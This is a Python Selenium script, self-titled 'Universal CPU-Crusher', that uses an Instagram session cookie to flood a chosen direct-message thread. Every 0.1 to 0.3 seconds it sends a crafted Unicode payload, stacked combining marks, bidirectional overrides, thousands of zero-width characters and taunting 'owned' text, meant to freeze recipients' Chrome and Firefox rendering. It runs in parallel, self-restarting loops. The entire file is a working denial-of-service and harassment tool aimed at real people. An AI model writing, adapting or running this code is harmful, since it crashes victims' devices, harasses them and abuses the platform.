# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER NC (UNIVERSAL CPU-CRUSHER)
# 📅 STATUS: GECKO-REFLOW + CHROMIUM-THRASHER | 10 AGENTS | 0.1s BURST

import os, time, random, threading, sys, gc, tempfile
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- MATRIX CONFIG ---
THREADS = 2
SESSION_LIMIT = 180 
MACHINE_ID = os.getenv("MACHINE_ID", "1")

def get_universal_crusher_payload(target_name):
    """The Universal Crusher: Optimized for Chrome and Firefox Freezes."""
    header = f"👑 𝖯𝖱𝖠𝖵𝖤𝖤𝖱 𝖯𝖠𝖯𝖠 👑 SYSTEM FAILURE: {target_name.upper()} HAS BEEN OWNED\n"
    
    # 💥 THE 'GECKO-TRAP' (ZWNJ + Variation Selectors)
    # Forces Firefox to restart text-shaping every 2 characters.
    gecko_trap = "\u200C\ufe0f" * 150 
    
    # 💥 PLANE-1 OVERLAYS (Vector Glyphs)
    # Triggers 'Complex Rendering Path' in all browsers.
    vector_chaos = "𝔓𝔄𝔙𝔈𝔈𝔔 𝔓𝔄𝔓𝔄 " * 8
    
    # 💥 THE '8x DENSITY' ZALGO (100 marks per character)
    z_tower = "̸" * 100
    
    # 💥 MEMORY BLOAT (6,500 invisible markers)
    bloat = "".join(random.choice(["\u200B", "\u200D", "\u2060", "\uFEFF"]) for _ in range(6500))
    
    lines = [header, gecko_trap, vector_chaos, bloat]
    
    for i in range(65):
        # BiDi Overloads to target the 'Directional Stack' in Firefox/Gecko
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        # Adding ZWNJ (\u200C) at the end of each line to force reflow
        lines.append(f"{prefix} 𝖯𝖱𝖠𝖵𝖤𝖤𝖱_𝖮𝖶𝖭𝖲_𝖸𝖮𝖴 {z_tower} \u200C")
    
    return "\n".join(lines)[:9950]

def get_driver(agent_id):
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--window-size=1920,1080")
    # 2026 Stealth User-Agent
    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
    return webdriver.Chrome(options=chrome_options)

def run_life_cycle(agent_id, cookie, target_id, target_name):
    while True:
        driver = None
        try:
            print(f"[M{MACHINE_ID}-A{agent_id}] ⚡ UNIVERSAL CRUSHER DEPLOYED...", flush=True)
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(7)
            driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
            time.sleep(12)

            session_start = time.time()
            while (time.time() - session_start) < SESSION_LIMIT:
                try:
                    box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
                    
                    # 🔥 HIGH-IMPACT BURST: 0.1s - 0.3s
                    payload = get_universal_crusher_payload(target_name)
                    driver.execute_script("""
                        var el = arguments[0];
                        document.execCommand('insertText', false, arguments[1]);
                        el.dispatchEvent(new Event('input', { bubbles: true }));
                    """, box, payload)
                    
                    box.send_keys(Keys.ENTER)
                    
                    print(f"[M{MACHINE_ID}-A{agent_id}] 💥 IMPACT DELIVERED", flush=True)
                    time.sleep(random.uniform(0.1, 0.3)) 
                    
                except:
                    time.sleep(5)
                    break 
        except Exception: pass
        finally:
            if driver: driver.quit()
            gc.collect()
            time.sleep(3)

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    target_name = os.environ.get("TARGET_NAME", "Target").strip()
    if not cookie or not target_id: sys.exit(1)
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for i in range(THREADS):
            executor.submit(run_life_cycle, i+1, cookie, target_id, target_name)

if __name__ == "__main__":
    main()
